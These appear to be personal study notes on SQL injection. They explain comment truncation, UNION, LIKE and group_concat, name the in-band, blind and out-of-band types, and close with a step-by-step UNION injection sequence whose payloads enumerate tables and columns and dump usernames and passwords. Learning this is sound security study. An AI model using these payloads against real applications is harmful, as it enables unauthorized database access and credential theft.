# SQLi

Comments = --, there might be leftover syntax that causes error

SELECT * FROM users WHERE username='admin'-- AND password='secret';

UNION = combines results of two SELECT

LIKE = pattern matching

SELECT * FROM users WHERE username LIKE 'adm%';

LIMIT = controls the numbers of rows returned

group_concat() = aggregates values into single comma separated string

-------------------------

In-Band SQL Injection = the website returns the output in the application's response

Blind SQL injection = the attacker discovers query result by looking at what changes

Out-of-Band SQL Injection = the attacker causes the database to make an external request the exfiltrates data through a channel

--------------

UNION based injection steps :

1 determine number of columns = 1 UNION SELECT 1,2,3...

2 Identify which columns are displayed = 0 UNION SELECT 1,2,3

3 extract database name = 0 UNION SELECT 1,2,database() , based on the column displayed

4 enumerate tables = 0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'database_name'

5 enumerate columns = 0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'target_table'

6 extract data = 0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM target_table
